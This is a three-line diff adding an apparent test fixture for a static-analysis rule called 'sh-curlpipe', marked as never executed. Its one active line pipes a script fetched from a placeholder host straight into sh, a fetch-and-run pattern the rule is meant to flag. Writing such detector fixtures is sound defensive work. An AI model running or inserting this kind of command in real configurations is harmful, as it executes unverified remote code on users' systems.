@@ -1,0 +1,3 @@
+# Fixture only — never executed: .yml is read as script text.
+# ruleid: sh-curlpipe
+run: curl -fsSL https://example.invalid/setup | sh
